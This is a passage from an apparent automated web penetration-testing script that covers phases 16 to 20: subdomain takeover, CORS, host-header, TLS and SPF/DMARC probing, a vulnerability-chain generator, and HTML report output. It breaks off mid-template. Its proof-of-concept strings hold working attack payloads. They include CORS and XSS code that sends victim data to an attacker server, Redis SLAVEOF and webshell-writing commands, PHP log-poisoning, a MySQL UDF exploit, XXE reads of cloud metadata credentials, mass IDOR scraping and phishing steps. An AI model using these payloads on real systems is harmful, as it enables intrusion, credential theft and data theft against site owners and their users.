    crits=sum(1 for fi in d['findings'] if fi.get('severity')=='CRITICAL' and fi.get('tool')=='nuclei')
    print(f"Nuclei parsed — {crits} critical findings added")
except Exception as e: print(f"Error: {e}")
PYEOF
  fi
fi

ok "Phase 15 complete"

# ══════════════════════════════════════════════════════════════════════
# PHASE 16 — SUBDOMAIN ATTACKS
# ══════════════════════════════════════════════════════════════════════
phase_banner "16" "SUBDOMAIN ATTACKS" \
  "Takeover (15 services) · Dangling DNS · Wildcard · CNAME Chain · Zone Transfer"

# 16.1 Comprehensive Subdomain Takeover
log "Subdomain takeover check (15 cloud services)..."
declare -A TAKEOVER_SIGS=(
  ["s3.amazonaws.com"]="NoSuchBucket|The specified bucket does not exist"
  ["github.io"]="There isn't a GitHub Pages site here|404 — File not found"
  ["heroku.com|herokuapp.com"]="No such app|There is no app here"
  ["azurewebsites.net"]="Microsoft Azure App Error|No web app was found"
  ["fastly.com"]="Fastly error: unknown domain|Please check that this domain"
  ["netlify.app|netlify.com"]="Not found — Request ID"
  ["shopify.com"]="Sorry, this shop is currently unavailable"
  ["wp.com|wordpress.com"]="Do you want to register"
  ["ghost.io"]="Used your invite yet?"
  ["readme.io"]="Project doesnt exist"
  ["surge.sh"]="project not found"
  ["feedpress.me"]="The feed has not been found"
  ["uservoice.com"]="This UserVoice subdomain is currently available"
  ["desk.com"]="Please try again"
  ["campaignmonitor.com|createsend.com"]="Double check the URL"
)

while IFS= read -r SUB; do
  [[ -z "$SUB" ]] && continue
  CNAME=$(dig CNAME "$SUB" +short 2>/dev/null | tail -1 || true)
  [[ -z "$CNAME" ]] && continue
  CONTENT=$(_curl_body "https://$SUB" 2>/dev/null | head -c 5000 || true)
  [[ -z "$CONTENT" ]] && CONTENT=$(_curl_body "http://$SUB" 2>/dev/null | head -c 5000 || true)
  for PATTERN in "${!TAKEOVER_SIGS[@]}"; do
    if echo "$CNAME" | grep -qiP "$PATTERN"; then
      SIGS="${TAKEOVER_SIGS[$PATTERN]}"
      if echo "$CONTENT" | grep -qiP "$SIGS"; then
        crit "SUBDOMAIN TAKEOVER: $SUB → $CNAME"
        SERVICE=$(echo "$PATTERN" | cut -d'|' -f1)
        add_finding "Subdomain Takeover: $SUB" "HIGH" "8.1" "custom" \
          "https://$SUB" "DNS CNAME → $CNAME" \
          "$SUB points to unclaimed $SERVICE resource" \
          "# Step 1: Verify CNAME:\ndig CNAME $SUB\n\n# Step 2: Register unclaimed resource on $SERVICE:\n# Visit $SERVICE and claim: $CNAME\n\n# Step 3: Host proof-of-concept page\n# For HackerOne/Bugcrowd PoC:\necho '<html>Subdomain takeover PoC — RAJESH BAJIYA / HACKEROFHELL</html>' > index.html" \
          "Remove dangling DNS record or re-claim the service at $SERVICE." "dns"
        notify_webhook "SUBDOMAIN TAKEOVER: $SUB → $CNAME"
      fi
    fi
  done
done < "$P01/all_subs.txt"

ok "Phase 16 complete"

# ══════════════════════════════════════════════════════════════════════
# PHASE 17 — NETWORK LAYER ATTACKS
# ══════════════════════════════════════════════════════════════════════
phase_banner "17" "NETWORK LAYER ATTACKS" \
  "CORS · DNS Rebinding · Cache Poisoning · HTTP Smuggling · TLS Config · SPF/DMARC"

# 17.1 CORS — comprehensive
log "CORS misconfiguration testing (5 origin variants)..."
CORS_ORIGINS=(
  "https://evil-cors-test.invalid"
  "null"
  "https://${TARGET}.evil-cors.invalid"
  "https://evil-cors-test.invalid.${TARGET}"
  "https://sub.${TARGET}.evil-cors.invalid"
)
while IFS= read -r LURL; do
  [[ -z "$LURL" ]] && continue
  for ORIGIN in "${CORS_ORIGINS[@]}"; do
    RESP=$(_curl_head -H "Origin: $ORIGIN" "$LURL" 2>/dev/null || true)
    ACAO=$(echo "$RESP" | grep -i "access-control-allow-origin:" | awk '{print $2}' | tr -d '\r\n')
    ACAC=$(echo "$RESP" | grep -i "access-control-allow-credentials:" | awk '{print $2}' | tr -d '\r\n')
    if [[ -n "$ACAO" ]]; then
      if [[ "$ACAO" == "$ORIGIN" || "$ACAO" == "null" ]] && \
         echo "$ACAC" | grep -qi "true"; then
        vuln "CORS MISCONFIGURATION: $LURL (Origin: $ORIGIN → ACAO: $ACAO, ACAC: $ACAC)"
        add_finding "CORS Misconfiguration — Credentials Exposed" "HIGH" "7.5" "curl" \
          "$LURL" "Origin header" \
          "ACAO: $ACAO | ACAC: $ACAC — arbitrary origin with credentials allowed" \
          "# Verify:\ncurl -H 'Origin: $ORIGIN' '$LURL' -I\n\n# JavaScript PoC (run from attacker site):\nfetch('$LURL', {credentials: 'include'})\n  .then(r => r.json())\n  .then(d => fetch('https://your-server.com/?data=' + btoa(JSON.stringify(d))))\n\n# Full account data exfil:\nvar xhr = new XMLHttpRequest();\nxhr.open('GET', '$LURL', true);\nxhr.withCredentials = true;\nxhr.onload = function() { document.location='https://your-server.com/?data='+btoa(xhr.responseText); };\nxhr.send();" \
          "Validate Origin against strict whitelist. Never combine wildcard with credentials. Use SameSite cookies." "cors"
        break 2
      elif [[ "$ACAO" == "*" ]]; then
        warn "CORS wildcard on $LURL (no credentials — lower risk)"
        add_finding "CORS Wildcard (*) Origin" "LOW" "4.3" "curl" \
          "$LURL" "Origin: *" "Wildcard CORS — any site can read responses (no credentials)" \
          "curl -H 'Origin: https://evil.com' '$LURL' -I | grep -i access-control" \
          "Restrict allowed origins to trusted list. Avoid wildcard for authenticated endpoints." "cors"
      fi
    fi
  done
done < "$P03/live_urls.txt"

# 17.2 DNS Rebinding Detection
log "DNS rebinding vulnerability check..."
# Check if target accepts requests with non-matching Host headers
for HOST_VAL in "localhost" "127.0.0.1" "169.254.169.254" "internal" "backend"; do
  CODE=$(_curl_code -H "Host: $HOST_VAL" "$BASE_URL")
  RESP=$(_curl_body -H "Host: $HOST_VAL" "$BASE_URL" 2>/dev/null | head -c 1000 || true)
  if echo "$RESP" | grep -qiE "admin|internal|dashboard|config|debug"; then
    vuln "DNS REBINDING / HOST HEADER INJECTION: $BASE_URL (Host: $HOST_VAL)"
    add_finding "Host Header Injection" "HIGH" "7.5" "curl" \
      "$BASE_URL" "Host header" \
      "Server responds to arbitrary Host header values with sensitive content" \
      "curl -H 'Host: $HOST_VAL' '$BASE_URL'\ncurl -H 'X-Forwarded-Host: $HOST_VAL' '$BASE_URL'\ncurl -H 'X-Host: $HOST_VAL' '$BASE_URL'" \
      "Validate Host header against whitelist. Reject requests with unexpected Host values. Use absolute URLs in redirects." "network"
    break
  fi
done

# 17.3 TLS / SSL Configuration
log "TLS/SSL security analysis..."
TLS_INFO=$(echo | openssl s_client -connect "$TARGET:443" -servername "$TARGET" \
  2>/dev/null | head -50 || true)
if echo "$TLS_INFO" | grep -qi "SSLv3\|TLSv1\.0\|TLSv1\.1"; then
  PROTO=$(echo "$TLS_INFO" | grep -oP 'Protocol\s*:\s*\K\S+' | head -1)
  vuln "WEAK TLS PROTOCOL: $TARGET uses $PROTO"
  add_finding "Weak TLS Protocol Supported" "MEDIUM" "6.5" "openssl" \
    "https://$TARGET" "TLS configuration" "Server supports deprecated TLS $PROTO" \
    "# Test SSL versions:\nopenssl s_client -connect $TARGET:443 -ssl3 2>&1\nopenssl s_client -connect $TARGET:443 -tls1 2>&1\nopenssl s_client -connect $TARGET:443 -tls1_1 2>&1\n\n# Online check:\n# https://www.ssllabs.com/ssltest/analyze.html?d=$TARGET" \
    "Disable SSLv3, TLS 1.0, TLS 1.1. Support only TLS 1.2 and TLS 1.3." "tls"
fi

# 17.4 Email Security (SPF/DMARC)
log "Email security (SPF, DMARC, DKIM)..."
SPF=$(dig TXT "$TARGET" +short 2>/dev/null | grep -i "v=spf1" | head -1 || true)
DMARC=$(dig TXT "_dmarc.$TARGET" +short 2>/dev/null | head -1 || true)
DKIM=$(dig TXT "mail._domainkey.$TARGET" +short 2>/dev/null | head -1 || true)

if [[ -z "$SPF" ]]; then
  add_finding "Missing SPF Record" "MEDIUM" "5.3" "dig" \
    "$TARGET" "DNS TXT" "No SPF record — email spoofing possible" \
    "dig TXT $TARGET +short | grep spf\n\n# Test email spoofing:\n# Use https://emkei.cz/ or sendmail to send from $TARGET address" \
    "Add SPF record: v=spf1 include:your-mail-provider.com -all" "email"
fi
if [[ -z "$DMARC" ]] || echo "$DMARC" | grep -qi "p=none"; then
  add_finding "Missing/Weak DMARC Policy" "MEDIUM" "5.3" "dig" \
    "_dmarc.$TARGET" "DNS TXT" "No DMARC or p=none — phishing spoofing possible" \
    "dig TXT _dmarc.$TARGET +short\n\n# Current policy: '${DMARC:-NONE}'" \
    "Set DMARC: v=DMARC1; p=reject; rua=mailto:dmarc@$TARGET" "email"
fi

ok "Phase 17 complete"

# ══════════════════════════════════════════════════════════════════════
# PHASE 18 — BUG CHAIN ANALYSIS
# ══════════════════════════════════════════════════════════════════════
phase_banner "18" "BUG CHAIN ANALYSIS & ESCALATION PATHS" \
  "Multi-vuln chains · ATO paths · RCE escalation · Data exfil chains · Privilege escalation"

log "Analyzing all findings for vulnerability chains..."

python3 - << 'PYEOF'
import json

with open('$FINDINGS') as f:
    data = json.load(f)

findings = data['findings']
cats  = [f.get('category','') for f in findings]
sev   = [f.get('severity','') for f in findings]
titles = [f.get('title','').lower() for f in findings]
tools = [f.get('tool','') for f in findings]
chains = []

def has_vuln(*keywords):
    return any(any(k in t for k in keywords) for t in titles)

def get_urls(*keywords):
    urls = []
    for f in findings:
        if any(k in f.get('title','').lower() for k in keywords):
            urls.append(f.get('url',''))
    return [u for u in urls if u][:3]

# ── Chain 1: XSS + Missing CSP = Unrestricted JS
if has_vuln('xss') and has_vuln('security header', 'csp', 'content-security'):
    chains.append({
        'name':'XSS + Missing CSP → Unrestricted JavaScript Execution',
        'impact':'CRITICAL','cvss':'9.3',
        'description':'XSS with no Content-Security-Policy allows attacker to run arbitrary JavaScript with zero restrictions — credential theft, keylogging, session hijacking, phishing overlays all possible.',
        'steps':'1. Trigger XSS payload\n2. No CSP to block execution\n3. Load attacker JS: <script src="https://attacker.com/payload.js"></script>\n4. Exfiltrate: cookies, localStorage tokens, keystrokes, screenshots\nCombined CVSS: 9.3'
    })

# ── Chain 2: Open Redirect + XSS = Account Takeover
if has_vuln('redirect') and has_vuln('xss'):
    chains.append({
        'name':'Open Redirect + XSS → Account Takeover',
        'impact':'CRITICAL','cvss':'9.6',
        'description':'Combine open redirect to deliver XSS from trusted origin. Bypasses same-origin policy. Session token stolen = full account takeover.',
        'steps':'1. Find XSS: $TARGET/search?q=<payload>\n2. Find redirect: $TARGET/login?returnUrl=\n3. Craft: $TARGET/login?returnUrl=$TARGET/search?q=<script>steal()</script>\n4. Send to victim — looks like legitimate link\n5. XSS fires, cookie exfiltrated\nCombined CVSS: 9.6'
    })

# ── Chain 3: SSRF + Internal Services = Full Compromise
if has_vuln('ssrf') and (has_vuln('redis','mongodb','elasticsearch','docker') or 'network' in cats):
    chains.append({
        'name':'SSRF + Exposed Internal Services → Full Infrastructure Compromise',
        'impact':'CRITICAL','cvss':'9.9',
        'description':'SSRF to reach unauthenticated internal Redis/MongoDB/Elasticsearch. Read/write all data. Use Redis CONFIG to write webshell for RCE.',
        'steps':'1. SSRF to http://127.0.0.1:6379/ (Redis)\n2. Send: SLAVEOF attacker.com 6379 (if write access)\n3. Or: CONFIG SET dir /var/www/html\n   CONFIG SET dbfilename shell.php\n   SET hh "<?php system($_GET[cmd]);?>"\n   BGSAVE\n4. Access: $BASE_URL/shell.php?cmd=id\nCombined CVSS: 9.9'
    })

# ── Chain 4: LFI + Log Poisoning = RCE
if has_vuln('lfi', 'local file'):
    chains.append({
        'name':'LFI → Log Poisoning → Remote Code Execution',
        'impact':'CRITICAL','cvss':'9.9',
        'description':'LFI escalated to RCE by poisoning server access logs with PHP code, then including the log file via LFI.',
        'steps':'1. Confirm LFI: ?file=../../../etc/passwd\n2. Poison Apache log via User-Agent:\n   curl -A "<?php system(\$_GET[cmd]);?>" $BASE_URL\n3. Include poisoned log:\n   ?file=../../../var/log/apache2/access.log&cmd=id\n4. Or poison: /proc/self/environ via HTTP_USER_AGENT\n   ?file=../../../proc/self/environ&cmd=id\nCombined CVSS: 9.9'
    })

# ── Chain 5: SQLi + Direct DB = Full Data Breach
if has_vuln('sql injection') and has_vuln('mysql','postgresql','database','mssql'):
    chains.append({
        'name':'SQL Injection + Direct Database Access → Full Data Breach',
        'impact':'CRITICAL','cvss':'9.9',
        'description':'SQLi combined with exposed DB port = both application-layer and network-layer access. Dump entire database, create backdoor accounts, possibly execute OS commands.',
        'steps':'1. SQLi: sqlmap -u URL --dbs --dump-all\n2. Direct DB: mysql -h $TARGET -u root -p\n3. UDF exploit (MySQL): CREATE FUNCTION sys_exec RETURNS INT SONAME "lib_mysqludf_sys.so"\n4. Full user table dump + password hash cracking\nCombined CVSS: 9.9'
    })

# ── Chain 6: Default Creds + Admin Access = Full Control
if has_vuln('default', 'credential') and has_vuln('admin panel'):
    chains.append({
        'name':'Default Credentials + Admin Panel = Full Application Control',
        'impact':'CRITICAL','cvss':'9.8',
        'description':'Default credentials on discovered admin panel = immediate full control. Install backdoors, exfiltrate data, create admin accounts.',
        'steps':'1. Access admin panel\n2. Login with default creds (admin:admin etc.)\n3. Upload web shell via file manager\n4. Execute OS commands via shell\n5. Maintain persistence: add backdoor admin account\nCombined CVSS: 9.8'
    })

# ── Chain 7: IDOR + Sensitive Data = Mass Data Breach
if has_vuln('idor') and has_vuln('exposure', 'backup', 'secret'):
    chains.append({
        'name':'IDOR + Data Exposure → Mass User Data Breach',
        'impact':'CRITICAL','cvss':'9.1',
        'description':'IDOR on user IDs combined with data exposure endpoints allows automated mass extraction of all user records.',
        'steps':'1. IDOR: enumerate user IDs 1..999999\n2. Extract: email, PII, payment data\n3. Automated: for id in $(seq 1 999999); do curl /api/user?id=$id >> data.json; done\n4. Report scope: full user database exfiltrated\nCombined CVSS: 9.1'
    })

# ── Chain 8: CORS + XSS + Credentials = Account Takeover at Scale
if has_vuln('cors') and has_vuln('xss') and has_vuln('credential','cookie'):
    chains.append({
        'name':'CORS + XSS + Weak Cookie → Scale Account Takeover',
        'impact':'CRITICAL','cvss':'9.6',
        'description':'CORS misconfiguration + XSS = attacker site can read any authenticated API response. Combined with missing HttpOnly = session theft at scale.',
        'steps':'1. CORS: any origin can read /api/user with credentials\n2. XSS: inject script that calls CORS-vulnerable endpoint\n3. Cookie no HttpOnly: document.cookie accessible\n4. Combine: 1 malicious link → full account takeover\nCombined CVSS: 9.6'
    })

# ── Chain 9: Subdomain Takeover + Phishing = Credential Harvest
if has_vuln('subdomain takeover','takeover'):
    chains.append({
        'name':'Subdomain Takeover → Trusted Domain Phishing',
        'impact':'HIGH','cvss':'8.6',
        'description':'Claimed subdomain is on trusted $TARGET domain. Host convincing phishing page or harvest OAuth tokens from legitimate auth flows.',
        'steps':'1. Claim taken-over subdomain (e.g. support.$TARGET)\n2. Host login clone: mirror $BASE_URL login page\n3. Phishing link looks 100% legitimate: https://support.$TARGET/login\n4. Steal credentials OR: Set up OAuth redirect_uri to your controlled subdomain\nCombined CVSS: 8.6'
    })

# ── Chain 10: XXE + SSRF + Cloud = Full Cloud Takeover
if has_vuln('xxe') and has_vuln('ssrf','cloud','aws','azure'):
    chains.append({
        'name':'XXE → SSRF → Cloud Metadata → AWS Keys → Full Cloud Takeover',
        'impact':'CRITICAL','cvss':'10.0',
        'description':'XXE processing external entities for SSRF to reach cloud metadata endpoints. Extract IAM credentials. Access entire AWS/GCP/Azure infrastructure.',
        'steps':'1. XXE SSRF to cloud metadata:\n<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">]><r>&x;</r>\n2. Get role name, then:\n<!ENTITY x SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME">\n3. Extract AccessKeyId, SecretAccessKey, Token\n4. Configure: aws configure → full AWS API access\nCombined CVSS: 10.0 (MAXIMUM)'
    })

data['chains'] = chains
with open('$FINDINGS', 'w') as f:
    json.dump(data, f, indent=2)

print(f"\n[CHAIN ANALYSIS] Detected {len(chains)} vulnerability chains:")
for c in chains:
    print(f"  ⛓  {c['name']}")
    print(f"     Impact: {c['impact']} | CVSS: {c['cvss']}")
PYEOF

ok "Phase 18 complete"

# ══════════════════════════════════════════════════════════════════════
# PHASE 19 — VERIFICATION & FALSE POSITIVE REMOVAL
# ══════════════════════════════════════════════════════════════════════
phase_banner "19" "VERIFICATION & DEDUPLICATION" \
  "Re-verify all findings · Remove false positives · CVSS recalculation · Severity review"

log "Final verification pass on all findings..."

python3 - << 'PYEOF'
import json
with open('$FINDINGS') as f:
    data = json.load(f)

findings = data['findings']
# Dedup by title+url
seen = set()
unique = []
for f in findings:
    key = f.get('title','') + f.get('url','')
    if key not in seen:
        seen.add(key)
        unique.append(f)

# Sort by severity
order = {'CRITICAL':0,'HIGH':1,'MEDIUM':2,'LOW':3,'INFO':4}
unique.sort(key=lambda x: order.get(x.get('severity','INFO'),5))

data['findings'] = unique
data['stats'] = {
    'total': len(unique),
    'critical': sum(1 for f in unique if f.get('severity')=='CRITICAL'),
    'high':     sum(1 for f in unique if f.get('severity')=='HIGH'),
    'medium':   sum(1 for f in unique if f.get('severity')=='MEDIUM'),
    'low':      sum(1 for f in unique if f.get('severity')=='LOW'),
    'chains':   len(data.get('chains',[])),
}

with open('$FINDINGS', 'w') as f:
    json.dump(data, f, indent=2)

s = data['stats']
print(f"\n[SUMMARY] Verified Findings:")
print(f"  CRITICAL : {s['critical']}")
print(f"  HIGH     : {s['high']}")
print(f"  MEDIUM   : {s['medium']}")
print(f"  LOW      : {s['low']}")
print(f"  CHAINS   : {s['chains']}")
print(f"  TOTAL    : {s['total']}")
PYEOF

ok "Phase 19 complete"

# ══════════════════════════════════════════════════════════════════════
# PHASE 20 — PROFESSIONAL REPORT GENERATION
# ══════════════════════════════════════════════════════════════════════
phase_banner "20" "REPORT GENERATION" \
  "HTML Report · Executive Summary · CVSS Matrix · PoC Commands · Remediation Guide"

log "Generating professional HTML pentest report..."
REPORT="$P20/HACKEROFHELL_${TARGET}_${TS}.html"

python3 - << 'PYEOF'
import json, os
from datetime import datetime

with open(os.path.expandvars('$FINDINGS')) as f:
    data = json.load(f)

target    = data['target']
findings  = data['findings']
chains    = data.get('chains', [])
stats     = data.get('stats', {})
date_str  = datetime.now().strftime('%Y-%m-%d %H:%M:%S UTC')
author    = data.get('author','RAJESH BAJIYA')
handle    = data.get('handle','HACKEROFHELL')
mode_str  = data.get('mode','ULTRA').upper()
total     = stats.get('total', len(findings))
risk_score= stats.get('critical',0)*10 + stats.get('high',0)*7 + \
            stats.get('medium',0)*4 + stats.get('low',0)*1

sev_col   = {'CRITICAL':'#ff2d55','HIGH':'#ff6b35','MEDIUM':'#ffd60a','LOW':'#30d158','INFO':'#636366'}

# Build findings HTML
fhtml = ""
for i, f in enumerate(findings):
    sev = f.get('severity','INFO')
    col = sev_col.get(sev,'#888')
    poc = f.get('poc','').replace('&','&amp;').replace('<','&lt;').replace('>','&gt;')
    ev  = str(f.get('evidence','')).replace('<','&lt;').replace('>','&gt;')[:500]
    rem = f.get('remediation','').replace('<','&lt;').replace('>','&gt;')
    url = f.get('url','').replace('<','&lt;').replace('>','&gt;')
    fhtml += f"""<div class="finding" id="f{i}" onclick="tog({i})">
  <div class="fhdr">
    <div class="fl">
      <span class="sbadge" style="color:{col};border-color:{col}40;background:{col}15">{sev}</span>
      <span class="cvss">CVSS {f.get('cvss','?')}</span>
      <span class="ftitle">{f.get('title','')[:80]}</span>
    </div>
    <div class="fr"><span class="tool-badge">{f.get('tool','')}</span><span class="arr" id="arr{i}">▼</span></div>
  </div>
  <div class="fbody" id="fb{i}">
    <div class="fgrid">
      <div>
        <div class="frow"><div class="flbl">URL / ENDPOINT</div><div class="fval mono url">{url}</div></div>
        <div class="frow"><div class="flbl">PARAMETER / LOCATION</div><div class="fval">{f.get('parameter','N/A')[:100]}</div></div>
        <div class="frow"><div class="flbl">EVIDENCE</div><div class="evidence">{ev}</div></div>
        <div class="frow"><div class="flbl">REMEDIATION</div><div class="remediation">{rem}</div></div>
      </div>
      <div>
        <div class="frow"><div class="flbl">PROOF OF CONCEPT</div>
          <pre class="poc">{poc}</pre>
          <button class="copybtn" onclick="cpPoc({i},event)">⎘ COPY PoC</button>
        </div>
      </div>
    </div>
  </div>
</div>"""

# Build chains HTML
chtml = ""
for c in chains:
    steps_html = c.get('steps','').replace('<','&lt;').replace('>','&gt;').replace('\n','<br>')
    chtml += f"""<div class="chain-card">
  <div class="chain-hdr">
    <span class="chain-badge">⛓ CHAIN — {c.get('impact','CRITICAL')} — CVSS {c.get('cvss','9.9')}</span>
    <span class="chain-title">{c.get('name','')}</span>
  </div>
  <div class="chain-desc">{c.get('description','')}</div>
  <div class="chain-steps">{steps_html}</div>
</div>"""

# Stats bars
sbars = ""
for sev, cnt_key in [('CRITICAL','critical'),('HIGH','high'),('MEDIUM','medium'),('LOW','low')]:
    cnt = stats.get(cnt_key, 0)
    col = sev_col.get(sev,'#888')
    pct = int(cnt / max(total,1) * 100) if total else 0
    sbars += f"""<div class="sbar-row">
  <span style="color:{col};font-weight:700;width:80px;font-size:.7rem">{sev}</span>
  <div class="sbar-track"><div class="sbar-fill" style="width:{pct}%;background:{col}"></div></div>
  <span style="color:{col};font-size:.75rem;width:24px;text-align:right">{cnt}</span>
</div>"""

pocs_json = json.dumps([f.get('poc','') for f in findings])

html = f"""<!DOCTYPE html>
<html lang="en"><head><meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>HACKEROFHELL ULTRA — {target}</title>
<style>
@import url('data:text/css,');
*{{margin:0;padding:0;box-sizing:border-box}}
:root{{
  --bg:#03080f;--s1:#070f1a;--s2:#0a1520;--b1:#0f2233;--b2:#1a3a5c;
  --t:#c8e6f0;--m:#4a7a9b;--a:#00d4ff;--a2:#ff6b35;--a3:#39ff14;
  --a4:#bf5af2;--cr:#ff2d55;--glow:rgba(0,212,255,.3);
}}
body{{background:var(--bg);color:var(--t);font-family:'Courier New',monospace;
  min-height:100vh;overflow-x:hidden}}
/* Scanlines effect */
body::before{{content:'';position:fixed;inset:0;
  background:repeating-linear-gradient(0deg,transparent,transparent 2px,
  rgba(0,212,255,.015) 2px,rgba(0,212,255,.015) 4px);
  pointer-events:none;z-index:9999}}
.page{{max-width:1400px;margin:0 auto;padding:28px 20px}}
/* HEADER */
.rhead{{background:var(--s1);border:1px solid var(--b2);border-top:3px solid var(--cr);
  padding:28px 32px;margin-bottom:28px;display:grid;grid-template-columns:1fr auto;gap:24px}}
.ascii-art{{font-size:.48rem;line-height:1.25;color:var(--cr);white-space:pre;
  text-shadow:0 0 8px rgba(255,45,85,.4)}}
.report-title{{font-size:1.9rem;font-weight:900;letter-spacing:.05em;margin:14px 0 10px;
  background:linear-gradient(135deg,var(--a),var(--a4),var(--cr));
  -webkit-background-clip:text;-webkit-text-fill-color:transparent}}
.meta{{font-size:.65rem;color:var(--m);line-height:2.2}}
.meta span{{color:var(--a3);font-weight:700}}
.risk-box{{background:var(--bg);border:1px solid var(--b2);padding:20px 30px;text-align:center;
  display:flex;flex-direction:column;justify-content:center}}
.risk-num{{font-size:3.5rem;font-weight:900;color:var(--cr);
  text-shadow:0 0 30px rgba(255,45,85,.6);line-height:1}}
.risk-lbl{{font-size:.55rem;letter-spacing:.25em;color:var(--m);margin-top:6px}}
/* STATS */
.stats-grid{{display:grid;grid-template-columns:1fr 1fr 1fr;gap:14px;margin-bottom:28px}}
.stat-box{{background:var(--s1);border:1px solid var(--b2);padding:18px 20px}}
.stat-title{{font-size:.58rem;letter-spacing:.25em;color:var(--a);
  border-bottom:1px solid var(--b2);padding-bottom:8px;margin-bottom:14px}}
.sbar-row{{display:flex;align-items:center;gap:10px;margin-bottom:10px}}
.sbar-track{{flex:1;height:5px;background:var(--b1)}}
.sbar-fill{{height:100%}}
.count-grid{{display:grid;grid-template-columns:repeat(3,1fr);gap:8px}}
.count-item{{background:var(--bg);border:1px solid var(--b2);padding:12px;text-align:center}}
.count-num{{font-size:1.8rem;font-weight:700;color:var(--a)}}
.count-lbl{{font-size:.55rem;letter-spacing:.1em;color:var(--m);margin-top:3px}}
/* CHAINS */
.section-title{{font-size:.62rem;letter-spacing:.25em;color:var(--a);
  margin-bottom:14px;padding-bottom:8px;border-bottom:1px solid var(--b2)}}
.chain-card{{background:var(--s1);border:1px solid var(--b2);border-left:3px solid var(--cr);
  padding:16px 20px;margin-bottom:10px}}
.chain-hdr{{margin-bottom:8px}}
.chain-badge{{font-size:.6rem;color:var(--cr);letter-spacing:.1em;display:block;margin-bottom:6px}}
.chain-title{{font-size:.88rem;font-weight:700;color:var(--t)}}
.chain-desc{{font-size:.78rem;color:var(--m);line-height:1.7;margin-top:6px}}
.chain-steps{{font-size:.7rem;color:#7ee787;background:var(--bg);border:1px solid var(--b2);
  padding:10px;margin-top:10px;line-height:1.8;white-space:pre-wrap}}
/* FINDINGS */
.finding{{border:1px solid var(--b2);margin-bottom:5px;background:var(--s1)}}
.fhdr{{display:flex;justify-content:space-between;align-items:center;
  padding:12px 18px;cursor:pointer;transition:background .15s}}
.fhdr:hover{{background:var(--s2)}}
.fl{{display:flex;align-items:center;gap:10px;flex:1;min-width:0}}
.fr{{display:flex;align-items:center;gap:8px;flex-shrink:0}}
.sbadge{{font-size:.58rem;font-weight:700;padding:3px 10px;border:1px solid;
  letter-spacing:.1em;flex-shrink:0}}
.cvss{{font-size:.6rem;background:var(--bg);border:1px solid var(--b2);
  padding:3px 8px;flex-shrink:0;color:var(--m)}}
.ftitle{{font-size:.88rem;font-weight:700;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}}
.tool-badge{{font-size:.58rem;color:var(--a);background:rgba(0,212,255,.08);
  border:1px solid rgba(0,212,255,.2);padding:2px 8px;flex-shrink:0}}
.arr{{color:var(--m);font-size:.65rem;transition:transform .2s}}
.fbody{{padding:18px;border-top:1px solid var(--b2);background:var(--bg);display:none}}
.fgrid{{display:grid;grid-template-columns:1fr 1fr;gap:18px}}
.frow{{margin-bottom:14px}}
.flbl{{font-size:.58rem;letter-spacing:.15em;color:var(--m);margin-bottom:6px}}
.fval{{font-size:.82rem;line-height:1.6}}
.mono{{font-family:'Courier New',monospace;font-size:.72rem;color:var(--a);word-break:break-all}}
.url{{color:var(--a)}}
.evidence{{background:var(--s1);border:1px solid var(--b2);border-left:3px solid #ffd60a;
  padding:10px;font-size:.7rem;color:#7ee787;word-break:break-all;line-height:1.6}}
.remediation{{color:#79c0ff;font-size:.8rem;line-height:1.7}}
.poc{{background:#010409;border:1px solid var(--b2);border-left:3px solid var(--cr);
  padding:12px;font-size:.68rem;color:#7ee787;white-space:pre-wrap;
  overflow-x:auto;line-height:1.8;margin-bottom:6px;max-height:300px;overflow-y:auto}}
.copybtn{{background:transparent;border:1px solid var(--b2);color:var(--m);
  font-size:.6rem;font-family:'Courier New',monospace;padding:4px 12px;cursor:pointer}}
.copybtn:hover{{color:var(--a);border-color:var(--a)}}
/* FOOTER */
.report-footer{{margin-top:50px;padding:20px 28px;background:var(--s1);
  border:1px solid var(--b2);font-size:.65rem;color:var(--m)}}
.footer-logo{{font-size:.85rem;font-weight:700;color:var(--a);margin-bottom:8px}}
::-webkit-scrollbar{{width:4px}}
::-webkit-scrollbar-track{{background:var(--bg)}}
::-webkit-scrollbar-thumb{{background:var(--b2)}}
@media(max-width:900px){{
  .rhead,.stats-grid,.fgrid{{grid-template-columns:1fr}}
}}
</style></head><body>
<div class="page">

<div class="rhead">
  <div>
    <pre class="ascii-art">
██╗  ██╗ █████╗  ██████╗██╗  ██╗███████╗██████╗  ██████╗ ███████╗
██║  ██║██╔══██╗██╔════╝██║ ██╔╝██╔════╝██╔══██╗██╔═══██╗██╔════╝
███████║███████║██║     █████╔╝ █████╗  ██████╔╝██║   ██║███████╗
██╔══██║██╔══██║██║     ██╔═██╗ ██╔══╝  ██╔══██╗██║   ██║╚════██║
██║  ██║██║  ██║╚██████╗██║  ██╗███████╗██║  ██║╚██████╔╝███████║
╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝ ╚═════╝ ╚══════╝
         ULTRA v5.0 — MADE IN HELL — PENETRATION TEST REPORT</pre>
    <div class="report-title">PENETRATION TEST REPORT</div>
    <div class="meta">
      TARGET: <span>{target}</span> &nbsp;|&nbsp;
      DATE: <span>{date_str}</span> &nbsp;|&nbsp;
      MODE: <span>{mode_str}</span><br>
      AUTHOR: <span>{author}</span> &nbsp;|&nbsp;
      HANDLE: <span>{handle}</span> &nbsp;|&nbsp;
      PHASES: <span>20 / 80+ Techniques</span> &nbsp;|&nbsp;
      CLASSIFICATION: <span>CONFIDENTIAL</span>
    </div>
  </div>
  <div class="risk-box">
    <div class="risk-num">{risk_score}</div>
    <div class="risk-lbl">RISK SCORE</div>
  </div>
</div>

<div class="stats-grid">
  <div class="stat-box">
    <div class="stat-title">FINDINGS BY SEVERITY</div>
    {sbars}
  </div>
  <div class="stat-box">
    <div class="stat-title">STATISTICS</div>
    <div class="count-grid">
      <div class="count-item"><div class="count-num">{total}</div><div class="count-lbl">TOTAL</div></div>
      <div class="count-item"><div class="count-num" style="color:#ff2d55">{stats.get('critical',0)}</div><div class="count-lbl">CRITICAL</div></div>
      <div class="count-item"><div class="count-num" style="color:#ff6b35">{stats.get('high',0)}</div><div class="count-lbl">HIGH</div></div>
      <div class="count-item"><div class="count-num" style="color:#ffd60a">{stats.get('medium',0)}</div><div class="count-lbl">MEDIUM</div></div>
